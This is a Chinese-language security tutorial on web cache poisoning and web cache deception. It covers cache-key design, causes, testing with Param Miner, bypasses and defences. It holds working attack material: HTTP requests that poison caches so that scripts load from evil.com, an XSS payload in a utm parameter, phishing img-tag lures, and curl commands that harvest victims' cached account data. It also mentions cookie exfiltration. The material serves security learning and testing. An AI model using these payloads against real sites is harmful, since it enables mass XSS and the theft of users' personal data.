# Web 缓存投毒与缓存欺骗（Cache Poisoning / Web Cache Deception）

## 一句话理解
缓存投毒是攻击者把"带毒响应"骗过缓存存下来，让后续**所有用户**拿到恶意内容；缓存欺骗是反过来——骗**受害者本人**的敏感页面被公共缓存存下来，攻击者再匿名取走。一个是"我投毒、大家受害"，一个是"受害者中毒、我来收"。

## 基础理解
### CDN / 缓存工作原理
- 缓存层（CDN、反向代理、应用级缓存）位于用户与源站之间：key 已存在 → 命中（HIT，秒回）；不存在 → 回源取响应并按规则决定是否存一份（MISS）
- **cache key**：决定"哪些请求算同一个缓存条目"，通常 = 路径 + 少量白名单参数/头
- 观察标志：`X-Cache: HIT/MISS`、`Age: 30`（缓存了多久）、`Via`、`CF-Cache-Status`、`CF-RAY`（Cloudflare）
- 是否存储取决于缓存规则（路径/扩展名/状态码）+ 响应头（Cache-Control）——敏感页若同时满足"规则想存"且"没有 no-store"，就会被存下，缓存欺骗成立

关键认知：**不进 cache key 的输入（unkeyed input）仍可能影响响应内容**——响应变了但 key 没变，这就是投毒的根。

典型缓存键配置（nginx）：
```nginx
# 缓存键 = 主机名 + URI（不含 query string、不含任何请求头）
proxy_cache_key $host$uri;
# 若源站根据 Referer / X-Forwarded-Host 等头改变响应 → 同 key 不同内容 → 可投毒
```

### 投毒 vs 欺骗 vs 走私
| 维度 | 缓存投毒 | 缓存欺骗 | 请求走私 |
| --- | --- | --- | --- |
| 受害者 | 所有命中缓存的用户 | 单个受害者本人 | 同连接的下一个用户 |
| 攻击面 | unkeyed 输入影响响应 | 静态规则缓存动态页面 | 前后端边界解析不一致 |
| 结果 | 缓存"恶意内容" | 缓存"敏感内容" | 前缀拼进他人请求 |

走私是投毒的手段之一：CL.TE 走私可直接把"带毒响应"写进缓存，见 [EXP-Request-Smuggling](./EXP-Request-Smuggling.md)。

## 常见成因
1. **unkeyed 头影响响应**：`X-Forwarded-Host`、`X-Forwarded-Scheme`、`X-Original-URL`、`X-Rewrite-URL` 等头不进 cache key，却被应用用于拼接绝对 URL、生成跳转、错误页
2. **cache key 设计不完整**：只取路径不取参数、参数/头白名单遗漏，导致"同 key 不同内容"
3. **缓存参数隐藏（cache parameter cloaking）**：CDN 忽略 `utm_` 前缀参数（如 Cloudflare 的 utm 规则）做缓存优化，但源站仍渲染该参数——`?utm_content=<script>` 打进缓存
4. **静态扩展名规则过宽**："任意 `.js/.css/.png` 结尾的路径都缓存"
5. **源站路由宽容**：`/account/settings/x.js` 被当作 settings 的子路径，返回登录后页面而非 404
6. **缺少保护头**：敏感响应没有 `Cache-Control: private/no-store`，或被缓存规则强制覆盖

## 常见危害
- 一次投毒 = **全站用户**执行恶意 JS（存储型 XSS 的全站放大版）；篡改首页/跳转可做大规模钓鱼
- 投毒 API 响应污染前端渲染逻辑（改价格、改按钮指向）
- 缓存欺骗直接泄露受害者邮箱、手机号、API token 等个人信息
- 与走私组合可劫持他人会话

## 典型利用思路
### 一、缓存投毒（Cache Poisoning）
#### 1. 经典 unkeyed 头投毒
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
```http
HTTP/1.1 200 OK
X-Cache: MISS
...
<script src="https://evil.com/1.js"></script>
<!-- 页面用 X-Forwarded-Host 拼接了资源绝对地址，evil.com 是攻击者域名 -->
```
该响应被存入缓存后，所有访问 `/` 的用户都加载 `evil.com/1.js`。

其他高频 unkeyed 头场景：

```http
# 场景1：X-Forwarded-Scheme 投毒重定向（PortSwigger 经典实验）
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
# 源站认为"用户用 http 访问了 https 站"，返回 302 重定向到 https 版本
# 该 302 响应被缓存 → 全站用户访问任何资源都被反复重定向 → 站点瘫痪/可串联跳转劫持

# 场景2：X-Original-URL 路由覆盖
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin
# 缓存层按 GET / 计键，源站却渲染了 /admin 内容 → 把管理页投进首页的缓存键
```

#### 2. 利用形式
- **绝对链接注入 → 存储型 XSS**：evil.com 上的 `1.js` 执行任意代码，全站生效
- **投毒重定向**：如上场景 1，让全站资源反复 301 跳转（DoS / 串联钓鱼）
- **投毒 API 响应**：污染前端定时拉取的配置/JSON 接口，篡改渲染逻辑
- **缓存键注入（cache key deception）**：利用 CDN 忽略 `utm_` 参数的规则缓存恶意内容
- **投毒 Cookie 值**：部分应用把 `X-Forwarded-For` 回写进 Set-Cookie 分析字段，若该头不进 key 且值被渲染 → 反射进页面打 XSS

```text
# utm 参数不进 cache key 但源站渲染 —— 同 key 两种内容
GET /home?utm_content=<script>alert(1)</script>
# 存进缓存后，访问 /home 的所有用户命中带毒版本
```

#### 3. 完整案例流程
```text
1. 信息收集：目标 https://cache.ctf.io 响应带 X-Cache: MISS 与 Age 头 → 存在缓存层
2. 手工 fuzz unkeyed 头：发送 X-Forwarded-Host: evil.com
   响应中资源引用变成 https://evil.com/1.js → 该头影响响应内容
3. 确认缓存行为：同一请求发两次，第二次 X-Cache: HIT 且带毒内容仍在
   → 头不进 cache key，投毒成立
4. evil.com 部署 1.js（无害验证 payload：document.title='poisoned'）
5. 等待其他用户访问 https://cache.ctf.io/ → 命中缓存 → 全站用户执行
```

报文级对比（投毒一次、放大全员）——普通用户不带任何恶意头访问：

```http
GET / HTTP/1.1
Host: cache.ctf.io

HTTP/1.1 200 OK
X-Cache: HIT
Age: 47
...
<script src="https://evil.com/1.js"></script>
<!-- 普通用户根本没发过 X-Forwarded-Host，却被投毒 —— 这就是缓存的"放大"效应 -->
```

evil.com 上的 1.js 测试期只做无害标记（`document.title='cache-poisoned-test'`），确认命中后立即清理缓存；实际攻击版本才换 cookie 外带（仅授权演练环境使用）。

### 二、Web 缓存欺骗（Cache Deception）
#### 1. 原理
```text
/account/settings        → 正常需要登录，返回当前用户设置页（含邮箱/手机号）
/account/settings/x.js   → 源站宽容路由：当 settings 子路径处理，返回同样的登录后页面
                          → 缓存按 ".js 静态资源" 规则把它缓存了
攻击者匿名访问 /account/settings/x.js → 拿到缓存中受害者的敏感页面
```

#### 2. 攻击条件
- 缓存层有静态扩展名规则：`.js/.css/.png` 结尾 → 强制缓存且 TTL 长
- 源站路由宽容：未知子路径不返回 404，而是渲染父路径内容（Rails/Django 通配路由、SPA 前端代理常见）
- 响应缺少 `Cache-Control: private` 保护，或缓存规则忽略源站头

#### 3. payload 与利用步骤
```text
1. 机制验证（用自己的测试账号）：
   登录后访问 https://target.com/account/settings/x.js
   - 返回的是登录后的设置页（而非 404）→ 源站路由宽容
   - 连续请求，Age 头增长 / 第二次 X-Cache: HIT → 缓存生效
2. 诱导受害者（登录态）访问该 URL → 缓存层替源站存下"受害者专属"响应
3. 攻击者隔几秒匿名访问同一路径：
   curl -s https://target.com/account/settings/x.js
   → 拿到含受害者邮箱、手机号、API token 的页面
```

#### 4. 诱导受害者访问的方式
```html
<!-- 恶意邮件/钓鱼页面嵌图片，受害者浏览器带着登录态自动请求 -->
<img src="https://target.com/account/settings/x.js">
```
- 邮件正文/论坛富文本中嵌 `<img>` / `<link>` / `<iframe>`，受害者打开即触发
- 社工话术引导点击"个人主页头像链接"，路径实为 `/account/settings/x.js`

#### 5. 完整案例流程
```text
1. 侦察：/account/settings 需登录，响应头没有 Cache-Control: private/no-store
   → 保护缺失，具备欺骗前提
2. 机制验证（用攻击者自己的账号，别碰他人数据）：
   - 登录后访问 /account/settings/x.js → 源站宽容路由返回 200 + 完整设置页
   - 缓存层静态规则命中 → 该响应被缓存
   - 闭环验证：退出登录后再访问同 URL → 仍能拿到刚才自己账号的页面
3. 投放诱饵（关键是让"受害者本人"先访问）：
   - 给受害者发邮件/私聊，正文嵌 <img src=".../account/settings/x.js">
   - 受害者打开邮件瞬间，浏览器带其登录态自动请求 → 缓存层存下"受害者专属响应"
4. 收割（攻击者匿名发起）：
   curl -s https://target.com/account/settings/x.js -o victim.html
   → victim.html 含受害者邮箱、手机号、甚至页面里的 API token
5. 注意窗口期：必须在 TTL 过期前（且下一位用户覆盖缓存前）完成收割
```

目标路径遍历：找"登录后才有内容、且无 private 头"的动态页面，逐一尝试 `/account/settings/x.js`、`/user/profile/x.css`、`/api/userinfo/x.png`、`/my/orders/x.txt` 等静态扩展名后缀。

## 实战排查思路
### 1. 判断有无 CDN / 缓存
```bash
# 看缓存指纹头
curl -s -I https://target.com/ | findstr /i "x-cache age via cf-cache cf-ray"
```
- 有 `X-Cache`、`Age`、`Via`、`CF-Cache-Status`、`CF-RAY` → 明确有缓存
- 没有回显头时：连续请求对比响应时间（命中 < 回源）、多 IP/多地 ping、在线 CDN 检测工具

### 2. 区分 HIT / MISS 行为
```bash
# 同一请求连发两次，观察缓存状态翻转 MISS → HIT
curl -s -I https://target.com/home; curl -s -I https://target.com/home
```
- 第一次 MISS、第二次 HIT → 缓存工作正常
- HIT 状态下改 unkeyed 头仍返回同一份内容 → 头不进 key，投毒候选入口
- 修改后再等 TTL 过期或找 purge 接口，恢复现场

### 3. Param Miner 自动化
Burp 插件 Param Miner 内置上千个 unkeyed 头字典，自动识别缓存投毒入口：

```text
1. 安装：BApp Store 搜索 "Param Miner" 安装
2. 使用：Burp 中对目标请求右键 → Guess headers（fuzz unkeyed 头）
   可选：Guess params（fuzz 隐藏参数）、勾选 Add cache buster 自动加防干扰参数
3. 原理：每个候选头发两次——第一次带投毒值（如 X-Forwarded-Host: evil.com）、
   第二次不带；若第二次响应仍体现投毒值 → 带毒响应被缓存且该头不进 key
   → 报告为 "cache poisonable"
4. cache buster（随机参数）很关键：避免每次都命中真实用户留下的干净缓存
```

手工等价：改头发一次记录响应，再去头发第二次——若仍是带毒版本即投毒成立（Burp Repeater 即可完成）。

### 4. 谨慎测试警示
- **投毒会污染真实用户看到的缓存内容**：必须用无害 payload（改标题、console.log，不外带数据），测完请求缓存刷新（purge API / 联系运营）或等 TTL 过期
- 缓存欺骗测试先用**自己的测试账号**验证机制，确认成立即可报告，不要缓存/触碰他人数据
- 未授权测试缓存投毒可能构成实际损害，务必在授权范围内进行

## 常见绕过思路
- **缓存键混淆**：`/home` 已缓存 → 试 `/Home`（大小写）、`/home?`、`/home%20`、`//home`，让恶意请求绕开已存在的干净条目、命中一个新的"可投毒 key"
- **路径规范化差异**：`/%2e%2e/`、`/..;/`、`/home/..;/home`——缓存与源站对路径解析不一致，同一内容对应不同 key
- **参数分隔符差异**：`?;a=1`、`?a=1&`、`?a=%00`，绕过参数进键的过滤逻辑
- **扩展名变体（缓存欺骗）**：`x.js` 被拦就试 `x.css`、`x.png`、`x.ico`、`x.txt`、`x.nonexist`——部分配置对 404 响应也缓存
- **目录层数**：`/account/settings/a/b/c.js`，宽容路由逐级回退时仍返回父页面
- **与走私联动**：走私把带毒响应直接塞给缓存，不受 unkeyed 头限制

## 防御要点
- cache key 设计完整：路径 + 必要参数/头全覆盖；**任何影响响应内容的输入都必须进 key 或被移除**
- 敏感响应强制 `Cache-Control: private, no-store`，缓存层显式尊重源站保护头
- 静态缓存规则用"白名单路径 + 扩展名"双条件，禁止"任意 `.js` 结尾就缓存"
- 源站路由严格化：未知子路径返回 404，删除宽容/通配路由
- 在反代层统一重写/剥离 `X-Forwarded-*` 等 unkeyed 头，不让应用直接消费
- CDN 厂商配置审计：Cloudflare Cache Everything 的例外清单、Fastly VCL、nginx proxy_cache_key 逐一复核
- 上线前用 Param Miner 自测投毒面

## 速查清单
| 检查项 | 方法 | 判定 |
| --- | --- | --- |
| 有无缓存 | 看 X-Cache / Age / CF-Cache-Status / CF-RAY | 有 → 继续测 |
| unkeyed 头 | Param Miner / 手工改头看响应是否变化 | 响应变且不进 key → 投毒入口 |
| 投毒确认 | 同一请求两次，第二次 HIT 且带毒内容 | 成立 |
| 缓存欺骗 | 登录态访问 `/settings/x.js` | 返回登录页且被缓存 → 成立 |
| 缓存键混淆 | 大小写 / `//` / `%2e` / 参数分隔符变体 | HIT 行为异常 → 键设计有洞 |

常用 unkeyed 头速查：
```text
X-Forwarded-Host / X-Forwarded-Scheme / X-Forwarded-Port / X-Forwarded-Proto / X-Host
X-Original-URL / X-Rewrite-URL          # 应用层路由覆盖头
X-HTTP-Method-Override                  # 方法覆盖
CF-Connecting-IP / Fastly-Client-IP / True-Client-IP   # 特定 CDN 回源头
```

## Reference
- [James Kettle - Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [James Kettle - Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [PortSwigger - Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger - Web cache deception](https://portswigger.net/web-security/web-cache-deception)
- [Param Miner - GitHub](https://github.com/PortSwigger/param-miner)
- [HTTP 请求走私（投毒的联动手段）](./EXP-Request-Smuggling.md)
